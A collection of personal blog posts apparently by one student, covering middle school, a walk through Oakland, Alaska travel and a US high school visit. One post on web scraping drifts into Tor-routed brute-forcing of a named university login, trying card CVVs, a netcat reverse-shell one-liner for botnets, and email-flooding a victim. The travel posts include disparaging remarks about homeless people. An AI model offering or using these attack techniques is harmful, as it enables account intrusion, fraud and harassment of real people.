class and feeling too well. That\u2019s right in some\nways, but he kind of goes too far. That\u2019s math class becomes my worst\nclass ever since.</p>\n<p>When someone laughed Mr.Xu would say, \u2018What\u2019s funny?\u2019 He would then\nlet that person stand up and ask them questions, even if that person\ndidn\u2019t do anything.</p>\n<p>He thought that when any of us smiling, we didn\u2019t focus. But how\nwould a person focus so long under great pressure?</p>\n<p>We had a test. It is about parallel lines and equivalent angles.\nMr.\u00a0Xu threatened us that whoever gets too low in the test will go to\nthe slow class. I think I did really badly on the test. I hope the score\nwill never be announced.</p>\n<p>Mr.\u00a0Chen never goes too far. I don\u2019t know why. Maybe he just don\u2019t\nlike dealing with people.</p>\n<p>The score was finally announced and it looks like a nightmare. I kind\nof shivered all through it. Finally, my score was announced and I got\nthe lowest score\u2013the teacher announces the worst score at last. I got\n\u201825+\u2019. That was the worst test I took since I went to Shibei Middle\nSchool. I am lucky. The teacher didn\u2019t write my real rank.</p>\n<h2 id=\"final-exams\">Final Exams</h2>\n<p>It\u2019s time to leave the division and the math classes to come back to\nfinal exams.</p>\n<p>In primary school, there are just three subjects (Chinese, Math, and\nEnglish). But now, there are also Geography, Computer, and Science. I am\nalso finishing my 366 books.</p>\n<p>I was not just busy, I was restless and frustrated. Though I kind of\nadjusted my life here, I couldn\u2019t bear it. I needed to prepare for the\nexpository and narrative writings; review the ordinary math, (\u2019cause we\nare too fast and I got less than eighty on the mock test and I was not\nsatisfied with the result); do the computer homework; go over geography,\nand science. Moreover, I need to spend another half hour every day\nreading a book.</p>\n<p>In the last, I got a bad score in Chinese and the minor subjects. I\njust wasn\u2019t accustomed to so many subjects. Many of my classmates\nstudied physics early and they knew all about science.</p>\n<p>Time is really slow when you want it to be fast, and really fast when\nyou want it to be slow.</p>\n<p>The first semester of sixth grade ended just like that, marking the\nend of one-eighth of my middle school life.</p>\n",

And I\nthought again and again my plan to move to north Europe or Alaska.</p>\n<h2 id=\"thinking-about-buying-another-computer\">Thinking about Buying\nAnother Computer</h2>\n<p>Last night I was thinking about buying another computer to try on\ngentoo and possibly build lfs, since I don\u2019t want my computer to broke\ndown again. I need to use my computer on a daily basis and modifying the\nBIOS settings and doing stuff may cause problems. I looked for laptops\non Amazon but they are not satisfactory. I want to use the new pc to\nplay with maybe gentoo and arch and lfs and blfs.</p>\n<p>I don\u2019t need much of sound, voice, display resolution, touchscreen,\nmouse, operating system, additional keyboard features, much storage\nspace, any additional repairing stuff, or any crappy Microsoft\nservices.</p>\n<p>I need a big screen(15.6 inch at least), high processing CPU and\nlarge RAM(at least 16gb), and no hardware problems.</p>\n<p>I tried searching on Amazon but it seems pretty expensive, and the\ncheaper ones are not trustworthy. Pinebook (220 dollars) seems fine\nexcept for it\u2019s 4gb ram, and in the end I thought System76 is a good\nchoice, but it was like around 1000 to 1500 dollars, a little too\nexpensive for me.</p>\n<h2 id=\"going-to-oakland\">Going to Oakland</h2>\n<p>I was fully frustrated and decided to go out to do something but try\nmake it short, and walked to Bart station. I stepped on the first Bart\nTrain that came, and it is going to San Francisco. I don\u2019t want to go to\nSan Francisco,so I decided to go to Oakland.</p>\n<p>I first got off the Bart train at West Oakland. West Oakland looked\nvery rundown indeed, and the streets are ugly and dirty. There aren\u2019t a\nlot of people around.</p>\n<h2 id=\"7th-street\">7th Street</h2>\n<p>Then I tried walking along 7th street and went to Market Street, and\nit began to look much nicer.

Then I went in KFC to\neat.</p>\n<p>The servant at KFC isn\u2019t very smart, and it took her a long time to\nunderstand what I am saying, and she couldn\u2019t get words straight. Also\nthe food is very expensive.</p>\n<h2 id=\"melancholy-and-thinking-of-home\">Melancholy and Thinking of\nHome</h2>\n<pre><code>    \u2026 Away from home, away from home\n    Away from home, away from home\n    Lord, I&#39;m five hundred miles away from home\n    \u2026 Not a shirt on my back\n    Not a penny to my name\n    Lord, I can&#39;t go back home this ole way</code></pre>\n<pre><code>    When the seas and mountains fall\n    And we come, to end of days\n    In the dark I hear a call\n    Calling me there\n    I will go there\n    And back again</code></pre>\n<h2 id=\"market-street\">Market Street</h2>\n<p>Then I walked around Market Street and it was very nice, to the point\nwhere I wouldn\u2019t mind living here actually. There are some geese in a\npark, and the streets are lined with beautiful trees and wide pavement.\nThe houses are also pretty beautiful.</p>\n<h2 id=\"homeless-camps\">Homeless Camps</h2>\n<p>Then I further walked north to 23rd street, and everything became\ndirty after that point. There are a lot of homeless people camping right\non the streets, which disgusted me.</p>\n<p>Then I walked east to San Pablo Avenue, and it was so dirty. The\nstreets are lined with homeless camps on San Pablo avenue, and smelled\nof pee and stink. I was very much annoyed indeed.</p>\n<p>Then I started running a little bit, and I run till Telegraph avenue.\nThere are a million homeless people on the streets along the way, and\nall garbage from clothes to dumped foods. There are people with obvious\nphysical problems standing in the middle of streets.</p>\n<h2 id=\"downtown-oakland\">Downtown Oakland</h2>\n<p>After walking a while on Telegraph Avenue things got better, and\nthere are many tall buildings on each way, so I reckoned it was like\ndowntown. It is kind of like San Francisco, but the streets weren\u2019t\nclean.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Anyways Oakland it not a good place I think. The west part on Market\nstreet was decent, but overall this crappy place is so bad.</p>\n",

So I\ndecided to try out scrapying information.</p>\n<h2 id=\"how\">Scraping Videos</h2>\n<p>When trying to scrape a website, the first thing to do is to inspect\nand try to find the html around the important information. Go\nctrl+shft+i then ctrl+f to find the relevant information.</p>\n<p>For example, youtube video uses have src field like</p>\n<pre><code>&lt;video tabindex=&quot;-1&quot; class=&quot;video-stream html5-main-video&quot; controlslist=&quot;nodownload&quot; style=&quot;width: 725px; height: 544px; left: 0px; top: 0px;&quot; src=&quot;blob:https://www.youtube.com/34b0564d-9f35-4581-bf5c-eed542280a0b&quot;&gt;&lt;/video&gt;</code></pre>\n<h3 id=\"blob-video\">Blob video</h3>\n<p>Blob obfuscates the source, preventing one from downloading the\nvideo. However, the source is usually loaded in m3u8 file. An m3u8 file\nusually consists of many segments of video files (they are combined\ntogether).</p>\n<p>M3u8 file is sent from the network tab, so go there to find some\nfiles (if the website uses other formats it is not valid).</p>\n<p>There are a few chrome extensions to download the m3u8(or detect the\nm3u8 file), <a href=\"https://fetchv.net/\">Fetchv</a>, <a\nhref=\"https://chrome.google.com/webstore/detail/blob-video-downloader/knpbbcbpainepebaalgbehcidbkednfb\">Blob\nvideo Downloader</a>.</p>\n<p>When sharing, the youtube uses embed tags. So you can also find a\nvideo with url like <a\nhref=\"https://www.youtube.com/watch?v=LlIkyhttqOI&amp;ab_channel=EtoGolos\"\nclass=\"uri\">https://www.youtube.com/watch?v=LlIkyhttqOI&amp;ab_channel=EtoGolos</a>\nin the url <a href=\"https://www.youtube.com/embed/LlIkyhttqOI\"\nclass=\"uri\">https://www.youtube.com/embed/LlIkyhttqOI</a>, except videos\nwith copyright.</p>\n<h3 id=\"network-sniffing\">Network Sniffing to Get m3u8</h3>\n<p>I use network sniffing to get the m3u8 files by getting the\nperformance, then extracting all urls. Typically the video players all\nhave an iframe, where there is embeded video inside, then inside the\niframe there is a embed video, which source is blob url, and the m3u8\nfile will be send over the network, which I can find the urls ending\nwith m3u8.</p>\n<pre><code>from selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nimport json\nimport time\n\noptions = Options()\noptions.set_capability(&#39;goog:loggingPrefs&#39;, {&#39;performance&#39;: &#39;ALL&#39;})\n\ndriver = webdriver.Chrome(options=options)\ndriver.get(&quot;https://www.instagram.com/p/CvKIrhaI_MO/&quot;)\ndriver.implicitly_wait(10)\ntime.sleep(5)\nlogs = driver.get_log(&quot;performance&quot;)\n\nm3u8_urls=[]\nfor entry in logs:\n    log_data = json.loads(entry[&quot;message&quot;])[&quot;message&quot;]\n    if log_data[&quot;method&quot;] == &quot;Network.requestWillBeSent&quot;:\n        urlfind=log_data[&quot;params&quot;][&quot;request&quot;][&quot;url&quot;]\n        # print(urlfind)\n        if urlfind.endswith(&quot;.m3u8&quot;) or (&quot;.mp4&quot; in urlfind): \n            m3u8_urls.append(urlfind)\nfor url in m3u8_urls:\n    print(f&quot;Extracted URL: {url}&quot;)\ndriver.quit()</code></pre>\n<p>This works with pretty much all except YouTube and Bilibili and\nNetflix, which use DASH (Dynamic Adaptive Streaming over HTTP). It\ngenerates a m4s file with short time to live. However, youtube\ndownloaders are all over the Internet, and there is a youtube-dl apt\nrepo. Instagram videos use mp4 file (which is strange). Twitch(I never\nused before) and some adult sites use m3u8.</p>\n<h3 id=\"converting-m3u8-to-mp4\">Converting m3u8 to mp4</h3>\n<p>After getting the m3u8 file I need to convert to mp4 file. I can do\nthis by using either the Cvlc or FFmpeg. Open the vlc and start network\nstream. I can also do this in command line</p>\n<pre><code>cvlc &quot;http://path.to/your/stream.m3u8&quot; --sout &quot;#std{access=file,mux=mp4,dst=/path/to/output/file.mp4}&quot; vlc://quit</code></pre>\n<p>Downloading video is pretty much useless for me since I can watch\n(almost) any videos myself with vpn and google search, which typically\ntakes like 10 seconds. Some premium videos cost few money these days.\nHowever, it is only useful, say, when you download the premium\nsubscription video on a separate server and sell it(or put it online\nwith ads), which is illegal and dangerous.</p>\n<h3 id=\"crawling-123movies\">Crawling 123movies</h3>\n<p>I used selenium, a python library.</p>\n<p>Code to find movie src iframe in the movie page. I first find the\nbutton to click to play, then I look for the iframe and get the src.</p>\n<pre><code>python_button = driver.find_element(By.ID ,&quot;play-now&quot;)\npython_button.click()\n\nsourceiframe = driver.find_element(By.ID ,&quot;playit&quot;) \ntime.sleep(3)\nreturn sourceiframe.get_attribute(&quot;src&quot;)</code></pre>\n<p>Then crawl the movie list page to find all movie htmls to send into\nthis code snippet above. The url begin with \"<a\nhref=\"https://ww9.0123movie.net/movie\"\nclass=\"uri\">https://ww9.0123movie.net/movie</a>\", so I find these in the\npage and then get the whole url.</p>\n<p>Then I write the moviename and link in a file</p>\n<h3 id=\"other-websites\">Other Websites</h3>\n<p>I haven't find any motivation to crawl other websites because<br />\n1 I don't think it's necessary since I can find the thing I want in like\n10 seconds and<br />\n2 it is kind of illegal</p>\n<h3 id=\"\u0441\u043c\u043e\u0442\u0440\u0438\u043c\">\u0441\u043c\u043e\u0442\u0440\u0438\u043c</h3>\n<p><a href=\"https://smotrim.ru\">\u0441\u043c\u043e\u0442\u0440\u0438\u043c</a> is a wonderful streaming\nwebsite, containing free movies, tv show, news streaming, and music,\netc. <a\nhref=\"https://player.smotrim.ru/iframe/live/id/63250/showZoomBtn/false/isPlay/true/mute/true/sid/smotrim_r1/\">\u0420\u043e\u0441\u0441\u0438\u044f\n1</a> is the most popular tv channel, and it sends m3u8 files live(each\nis like 15 seconds).</p>\n<p>There are also TV shows like <a\nhref=\"https://smotrim.ru/brand/64994\">\u0413\u0440\u043e\u0437\u043d\u044b\u0439</a>, or <a\nhref=\"https://player.smotrim.ru/iframe/video/id/2243454/sid/smotrim/isPlay/true/mute/true/\">embeded\nplayer</a>, and <a\nhref=\"https://cdn-v.rtr-vesti.ru/_cdn_auth/secure/v/vh/vod_hls/definst/smil:vh/smil/002/353/344_d20201122184744.smil/chunklist_b4050000_pd2854000.m3u8\">m3u8\nfile</a></p>\n<p>The point is those movies and tv shows are all free and so there is\nno point in downloading them or crawling anyways.</p>\n<h2 id=\"tor-crawling\">Tor Crawling</h2>\n<p>It is a good idea to use tor crawling (both hiding the server's ip\naddress and avoid sending too much requests from a single ip)</p>\n<p>First run sudo apt install tor, then sudo service start tor, then add\nthe following lines to python code</p>\n<pre><code>options=Options()\n\noptions.set_preference(&quot;network.proxy.type&quot;, 1)\noptions.set_preference(&quot;network.proxy.socks&quot;, &quot;127.0.0.1&quot;)\noptions.set_preference(&quot;network.proxy.socks_port&quot;, 9050)\noptions.set_preference(&quot;network.proxy.socks_version&quot;, 5)\noptions.set_preference(&quot;network.proxy.socks_remote_dns&quot;, True)\n\nbrowser = Firefox(options=options)</code></pre>\n<p>We can then access to onion sites</p>\n<pre><code>browser.get(&quot;http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/&quot;)</code></pre>\n<p>However, when crawling cloudflare sites there might be captcha.</p>\n<h3 id=\"opening-tor-browser\">Opening Tor Browser</h3>\n<p>Since tor is based on firefox, I can open tor browser from code.</p>\n<p>Find the location in terminal by</p>\n<pre><code>find ~/ -name firefox -type f</code></pre>\n<p>then</p>\n<pre><code>from selenium import webdriver\nfrom selenium.webdriver.firefox.options import Options\nimport time\n\ntor_path = r&quot;/[location]/tor-browser/Browser/firefox&quot;\ntor_profile=&quot;/[location]/tor-browser/Browser/TorBrowser/Data/Browser/profile.default&quot;\n\noptions = Options()\noptions.profile=tor_profile\noptions.binary_location = tor_path\noptions.set_preference(&quot;network.proxy.type&quot;, 1)\noptions.set_preference(&quot;network.proxy.socks&quot;, &quot;127.0.0.1&quot;)\noptions.set_preference(&quot;network.proxy.socks_port&quot;, 9150)\noptions.set_preference(&quot;network.proxy.socks_remote_dns&quot;, True)\n\ndriver = webdriver.Firefox(options=options)\n\ndriver.get(&quot;http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/&quot;)</code></pre>\n<p>Since I am scraping and not actually browsing, it is useful to\ndisable images</p>\n<pre><code>options.set_preference(&quot;permissions.default.image&quot;, 2)</code></pre>\n<h2 id=\"brute-forcing-passwords\">Brute-Forcing Passwords</h2>\n<p>Since I can mess up with the IP, I can make many attempts to\nbrute-force the password by sending many requests.</p>\n<p>On some websites like <a href=\"https://jw.ustc.edu.cn\">USTC\nlogin</a>, it is very difficult because it requires a verification code\nand cannot be accessed from tor browser.</p>\n<p>On other login forms, for example like <a\nhref=\"https://icourse.club/signin-3rdparty/?challenge=29qoq28e6nb0b8mctook&amp;next_url=https%3A%2F%2Fpi-review.com%2Fapi%2Ficourse-login%2Fverify&amp;from_app=PI+Review\">USTC\nIcourse</a>, it is very easy to brute force because it doesn't require\nany verification and can be accessed from tor. I can easily use the\nsendkeys function and try submit, and use many threads together to\nsubmit requests.</p>\n<p>Google account need passwords with at least 8 characters, and not in\ncommon passwords(I tried some of 10000 most common passwords and all\nfailed), so it is really hard to guess a gmail password.</p>\n<p>For example, I can go to the login page of openai with</p>\n<pre><code>try:\n    loginbutton = driver.find_element(By.XPATH,&quot;//*[contains(@class, &#39;btn-primary&#39;)]&quot;)\n    loginbutton.click()\nexcept:\n    loginbutton = driver.find_element(By.XPATH,&quot;//*[contains(@class, &#39;bg-[#3C46FF]&#39;)]&quot;)\n    loginbutton.click()</code></pre>\n<p>There are several applications (I think).</p>\n<p><br />\n1 Brute-forcing passwords(2/10000 percent success)<br />\n2 Log in with sms (1/100000 percent success with 6 digits, not too\nhard)<br />\n3 Getting a list of bank accounts then trying the cvv (1/1000-1/100000\npercent success if know the number and postal code correctly)</p>\n<p>However, they succeed with like 1 in 1 million probability. Moreover,\ngoogle login and mails like 163 logins all require captchas when\nvisiting with tor browser. Since security is economics, it is not a good\nidea to execute such attacks on popular websites like gmail or instagram\nor twitter. With that much legit web traffic, it is possible to ddos a\nwebsite.</p>\n<h2 id=\"reverse-shell\">Reverse Shell</h2>\n<p>I can gain remote access to machine by using ncat. Gaining access to\nremote servers construct a botnet.</p>\n<p>On the victim's machine just execute</p>\n<pre><code>nohup ncat [attacker&#39;s IP] [port] -e /bin/bash &amp;</code></pre>\n<p>Then close the window.</p>\n<p>On the attacker's machine listen on the corresponding port</p>\n<p>After this I gain access to execute bash script.</p>\n<p>Also, attacker can subscribe the victim email to mail lists so the\nvictim's inbox could be flooded with hundreds of emails.</p>\n<p>Use automated scripts to sign up the victim's addresss with many\nforums in a short time(with only email address and no confirmation).</p>\n<p>Some email signups need captchas or confirmation, other doesn't and\nthe script can sign the victim up easily with web crawler, look at <a\nhref=\"https://www.hup.harvard.edu/news/mailing-list.html%5D\">(this form\nI found online)</a> .</p>\n<p>While this attack requires much time to find the website and signup\nfor the email address, I think it is feasible because it automates email\nfrom other providers and basically floods the victim with thousands of\nemails.</p>\n<h2 id=\"accessing-the-shell-with-python\">Accessing the shell with\npython</h2>\n<p>Using the subprocess library, either with subprocess.run or\nsubprocess.Popen, I can access the shell easily and run commands. Use\nthe communicate function to run sudo commands like</p>\n<pre><code>import subprocess\n\npassword = &#39;&#39;\ncmd = &#39;sudo -S apt upgrade&#39;  # -S allows password from stdin\n\nprocess = subprocess.Popen(\n    cmd, \n    shell=True, \n    stdin=subprocess.PIPE, \n    stdout=subprocess.PIPE, \n    stderr=subprocess.PIPE\n)\n\n# communicate sends the password to the process&#39;s stdin\nstdout, stderr = process.communicate(input=f&#39;{password}\\n&#39;.encode())\n\nprint(stdout.decode())</code></pre>\n<p>Also, I can use the paramiko library to access the remote server.</p>\n<p>By accessing the shell with python I can then effectively control\nmultiple instances.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Web crawling is fun and made me understand html better. I think the\nmost valuable thing to do is doing data analytics using web crawler. It\nis easy to cross the line and go illegal crawling.</p>\n<p>Scraping videos is pretty much useless because I can watch any video\nI want in the first place, and distributing is dangerous and illegal.\nBrute-forcing passwords is not cost effective.</p>\n<h2 id=\"last\">Acknowledgements</h2>\n<p>Also, I think ChatGpt is a great tool to use when writing code\nbecause it answers questions accurately with code snippets that\nworked.</p>\n",

I\nslept pretty much all morning, and went to downtown in the afternoon. I\ndropped my bag off at the hotel, and carried my backpack. I first\nplanned to go to downtown, but the road wasn't suitable for walking and\nit was like 3 miles to downtown, so I ended up taking a bus. The bus is\nvery convenient, though.</p>\n<p>The views is spectacular, in fact, I am sure I won't be amazed by\nnormal sceneries. The scenery in Alaska in just on another level\naltogether. I could see mountains covered with ice in Delaney Park, and\nsee all the way to the other side of Knik Arm.</p>\n<p>It was hot today, and I ended up with only 1 layer of clothing and\ntaking 3 on my hands, thinking it was hot. As a result, I got tired soon\nfrom walking, and my feet was sore. I went around and got into a visitor\ncenter, where I chatted with 3 people for a while, then went to visit\nthe museum. But I was sore, so after a quick visit I went back and\nchecked in at the airbnb.</p>\n<p>The airbnb is much much better than the hotel, with only half\nprice.</p>\n<p>There are almost no homeless people in Alaska. There are few black\npeople, but all taxi drivers and bus drivers I encountered are black.\nPeople here are friendly, and some will stop and say hi and I walked\nby.</p>\n<p>I went to the Earthquake Park and Point Woronzof Beach. It was long\nwalk. I went there from the Lake Spenard, and it was so beautiful. I\nalso saw helicopters.</p>\n<p>It was hard to walk since there are almost nobody walking and cars\ndominate the road, however, the view was spectacular.</p>\n<p>I like the beach in Anchorage, which is more than 30 degrees north in\nlatitude to beaches in california.

I\ndidn't even finish booking for the tickets. I spend two hours at noon\nbooking everything and trying to wrap things up, but turns out that I am\nspending so much money on this trip. I booked an airbnb in Seward for a\nquite expensive price, and it didn't even include storing luggage after\ncheking out and shuttle, so I had to do everything myself.</p>\n<p>I initially planned to take a bus to midtown, but for some reasons\nthe bus didn't come, and in Google Maps it also didn't show that the bus\nis coming, so I ended up taking a lyft.</p>\n<p>I took a lyft to midtown and hiked around. The driver was chatty, and\nwe talked for a while. He told me his son is also a sophomore studying\neconomics at Boston with full scholarships, which I thought is much\nbetter than me, although he wanted his son to study engineering. He also\ntold me he grew up in orange county, and how he thought Europe is better\nthan US because of homeless problem. Overall he is very friendly guy. He\nmentioned that Puffin Inn is really bad, and there are shootings and\nshady people. I told him about my school and life too. The ride was too\nshort for a long chat, and we parted at Cuddy Park.</p>\n<p>Cuddy Park is mostly empty and there is a big lawn, but on the other\nside there are worn-down tents. That is the first time I saw\nhomelessness in Alaska.</p>\n<p>Midtown is very dirty, and poorly constructed, the roads almost wild\nand not suitable for pedestrians to walk. I walked very hard and\nconstantly looked at my phone. Then I walked to Chester Creek and walked\nalong the trails. There are also many other people walking and cycling\non the trail. Goose Lake is very beautiful, it is blue and I could see\nthe snowy mountains above the lake. There are some dogs from other\npeople which got me scared, though. But everything turned out all\nright.</p>\n<p>Then I went to University of Alaska, Anchorage. I thought the campus\nis very beautiful. In many places in China, the trees and grasses and\nlawns looks as though they are artificial--human made for recreation and\ngreeness. However, this campus looks as though it is constructed out of\na natural reserve. The campus is big and there are parking lots\neverywhere. In contrast, Berkeley looks dense and crowded. But I know\nthis is not the kind of university my parents would gladly let me go to,\nalthough I think it is really nice. I went into several school\nbuildings, which are open to the public, and got some water. There are\nalmost no people in the campus, and every building is connected to a\nparking lot. It is really hard to get around without a car. There is a\nfigure skating podium in the university and I think it is nice. Anyways\nAnchorage is much nicer than Berkeley but of course my parents won't let\nme go there for school or anything like that so there is no question\nafter all. Maybe I can come and be a teacher here after graduation, and\nwith a car I can go to glaciers and National Parks every weekend. Ah,\nimagine that.</p>\n<p>Then my legs got really sore and I had to go. I went to Lake Otis.\nThere is some park called Jacobson Park without a road on the map, and I\nwent in through a wild trail. The trail was so bad that half of it is\nwet, then I saw someone with a tent. I hadn't thought it strange and I\nwas like \"Sorry\", and then I saw that there are no roads ahead I was\nlike \"I am turning back\". Then I heard him say something like \"Can you\nspare me a dollar?\", and I got kind of scared, but since I am not sure I\njust kept going away at a faster pace.</p>\n<p>I walked around and it seems that the roads there are consists of\npopular university names like Duke, Stanford, Princeton, but there are\nno Harvard or Berkeley, which is strange. People were watering their\nlawns and a elderly woman said hi to me, which I replied the same back.\nBut by the time I almost couldn't continue walking. I sat on the ground\nnearby and called lyft.</p>\n<p>Then I decide to call it a day since I am leaving early morning\ntomorrow, and it is really hard for me to get up early, so I must\nprepare well. On the lyft back the driver chatted with me, and he asked\nmy information and I told him I was getting A or A- or B+ this semester,\nand he was like \"everything is A+, you should work harder\". And I\nthought again just how lazy I am, and how I would try to work harder\nnext semester, which is merely a thought in my head for pretty much all\nmy life. He also told me how he was feeding those homeless in Anchorage\nand there are 300 in total, some of them die of frost in winter. He said\nhe could take me around town and I told him I wanted to go to Kincaid\nPark, but since it is ordered in Lyft we just finished the trip and\nparted. Both lyft drivers aren't black this time.</p>\n<p>I ate at subways three times in two days (I only had 5 meals in\ntotal), but I think it is pretty nice.</p>\n<p>After two days of hard hiking I think I saw the equivalent of half a\nday of car driving, however, I think that walking is another unique\nexperience anyways.</p>\n<h3 class=\"photos2\" id=\"photos2\">Photos</h3>\n<p><br />\nAirbnb Malibu Road<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/OZCFzQfT-VjNfnhIhwIwnH4YYWy9Nw1sGzmajYCSb6GUo9MZ0lkknK7669MDSFT3pMjIYnVHB-Vvc5gZy_RYVE2fjm4ZyyVNoQGniJbmQM63ErPbhKpCtF7M0Mr-kwj-tNGor0xrByaKEsFBlw2WGsU=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nMidtown: Homeless in Alaska<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/h36i8c-zqrnX7Z08xT5A9sp_EUAsPiBAez9d2dGWQFbcKFH6sok1ASqAy6Upe51Z69SuNKiTQR0JF3cfTqY7T-HXejG-mp_5iawLflWxWm9rAV0DgjZN5P-bb_q21ApNEtxD96WFaSijmxaK-MGM_9Q=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nGoose Lake<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/EXVEXhuD9QDDBo3TUscDYdeDpJXPGp34D9iVRNdzS9VJGDbTXTQQyyvhwZ1i2GXfzzwbKuYLlUcZQ4el2hWLxTYZUb7DdQAGnUgHce5Px38B0dTT5qxxFj5bHAtDHIg5CR2ppXLYc4VMNySi00T_BH4=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nUniversity of Alaska Anchorage<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/kvAk_gFW0WgsfMSySaNVBldsls9rCPbyW31jFenHlWGd-YFmy7n6kMv6VLygorl3_jzzjLTLoDzMnC1afolyhVvuNnqpiYGGd9KzWOhl2HJgjOzsygNeiVukB2ThmH8E8r7nV0gxHZ7U5u50Gh9DKBg=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/VzSGkJ7A5Eyl9vVBzbv9AWBVHxl3O1to-Yriu97yLexhEBb44LVg_IigPVkYXk64njM95bMXZgZQDPOY9krQM5oboCPio72YCCnokX45HRrILCf-k0f98oi90hN3_JtTpbiVe-WOOLxXbccGeURtW04=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/flcIzTSKFrtdfGwueNaOU_z9zPbQKolzyV1ZARrNuIX7I788MxQzZuPdXKmaG19yg_zNOGAubQZ3IrcUFKWK6uruzTvfxWGSlquQ6t9I7ulP_YvA0qRq1prnvC3n_OS7tgkQZqyaY7_cE6dz0FsxpTo=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n</p>\n<div class=\"iframe\">\n<div class=\"document-root loading\">\n<div class=\"request-storage-access\">\n<div>\n<figure>\n<img src=\"//ssl.gstatic.com/docs/common/product/google_app_icon1.png\"\nclass=\"icon\" alt=\"Google\" />\n<figcaption aria-hidden=\"true\">Google</figcaption>\n</figure>\n</div>\n<div class=\"title-text\">\n<p>\u5141\u8a31\u300cGoogle\u300d\u5b58\u53d6\u4f60\u5fc5\u8981\u7684 Cookie</p>\n</div>\n<div class=\"subtitle-text\">\n<p>\u5982\u95dc\u9589\u5fc5\u8981\u7684 Cookie\uff0c\u4f60\u5c07\u7121\u6cd5\u5b58\u53d6\u6b64\u5167\u5bb9</p>\n</div>\n<div class=\"button-container\">\n<p><a href=\"https://support.google.com/drive?p=enable_storage_access\"\nclass=\"button\" target=\"cookieAccessHelp\">\u77ad\u89e3\u66f4\u591a\u8cc7\u8a0a</a></p>\n<p>\u5141\u8a31 Cookie</p>\n</div>\n</div>\n<div class=\"login\">\n<div>\n<figure>\n<img\nsrc=\"https://www.gstatic.com/images/branding/googleg/1x/googleg_standard_color_48dp.png\"\nclass=\"icon\" alt=\"Google \u6a19\u8a8c\" />\n<figcaption aria-hidden=\"true\">Google \u6a19\u8a8c</figcaption>\n</figure>\n</div>\n<div class=\"title-text\">\n<p>\u767b\u5165\u60a8\u7684 Google \u5e33\u6236</p>\n</div>\n<div class=\"subtitle-text\">\n<p>\u4f60\u5fc5\u9808\u767b\u5165\u624d\u80fd\u5b58\u53d6\u6b64\u5167\u5bb9</p>\n</div>\n<div class=\"button-container\">\n<p>\u767b\u5165</p>\n</div>\n</div>\n<div class=\"error\">\n<div>\n<figure>\n<img\nsrc=\"https://www.gstatic.com/images/branding/googleg/1x/googleg_standard_color_48dp.png\"\nclass=\"icon\" alt=\"Google \u6a19\u8a8c\" />\n<figcaption aria-hidden=\"true\">Google \u6a19\u8a8c</figcaption>\n</figure>\n</div>\n<div class=\"title-text\">\n<p>\u7121\u6cd5\u5b58\u53d6\u4f60\u7684 Google \u5e33\u6236</p>\n</div>\n<div class=\"subtitle-text\">\n<p>\u76ee\u524d\u7121\u6cd5\u5b58\u53d6\u6b64\u5167\u5bb9\u3002\u5982\u8981\u7e7c\u7e8c\u64cd\u4f5c\uff0c\u8acb\u5617\u8a66\u767b\u5165\u4f60\u7684 Google\n\u5e33\u6236\u6216\u5141\u8a31\u4f7f\u7528 Cookie\u3002</p>\n</div>\n<div class=\"button-container\">\n<p><a href=\"https://support.google.com/drive?p=enable_storage_access\"\nclass=\"primary-button button\"\ntarget=\"cookieAccessHelp\">\u77ad\u89e3\u66f4\u591a\u8cc7\u8a0a</a></p>\n</div>\n</div>\n</div>\n</div>\n",

Then I\nwent into the library for a few hours and listened to a literature\nclass, which was very easy and fun.</p>\n<p>What is interesting is when I was moving around campus staff don't\npoint and talk at you, and I don't see that many staff.

I was not getting\ninvolved anyhow with their daily life, and I have no friends here. I\nreally want to interact or just communicate with some of these students\nabout their daily life and what they like, just anything. This kind of\nlife feels foreign to me, and as a 17 yo, I really want to join in the\nconversation and have a various life in high school. Walking down the\nnoisy hallway, I felt like I could blend in easily with the school\ncommunity. Problem is I had almost no conversation today at that\nschool.</p>\n<p>When you don't know about anything and have no idea of what people\nare like, and have no idea of what life is gonna be, you really kind of\nlose a sense of direction and have no motives. Why do I want to do this?\nSometimes I wish I do not study at a university but in high school\n'cause that was supposed to be the right place for me, and they were\nsupposed to be unforgettable years. But from another's perspective, I\nwas more than lucky, and they envied me so much, being able to escape\nfrom the sad reality.</p>\n<p>I always feel a sense of loneliness at university. I feel like not\nbeing actively involved in anything. After so many days, I finally came\nto the conclusion that I could not live without the presence of other\npeople, that I am a member of society, and that I have to live with a\ncommunity and friends, not alone like Robinson Crusoe. Sometimes things\ndon't work that way.</p>\n<p>There are students of all races and looking very different. There are\nblack, white, and yellow, but they are kind of tall. What's more, some\npeople wear shorts when the weather is, like, 50 degrees. Other girls\nare dressed really hot. Some people wear heavy masks in school, but most\npeople don't at all.</p>\n<p>Students are walking in groups actively talking about the things that\nthey are doing and fun stuff; nobody is glued to their phones. I mean, I\ndon't see almost anybody looking on social media like in China.</p>\n<p>The classes in high school are mostly small and split into\ndiscussions, which is kind of interesting because you get to know other\npeople. The teachers don't do long and boring lectures that much.</p>\n<p>I do not want to be required to do lots of things. Teachers and\nparents are like, you should study, and that is your responsibility,\nwithout telling you why you should. Anyway, there are lots of people out\nthere well off who do not study but have talent. What I want to do right\nnow is to discover the world and understand things; in China, they say\nlike, doing this is harmful to you concentrating on studying and\nstopping doing it, so people went back to playing video games on their\nbeds. I do not see why what I am doing can't be a choice of my own; I\nmean, obviously, I am part of the society, but freedom to choose and to\nlive is vital, and that freedom is worth anything.</p>\n",

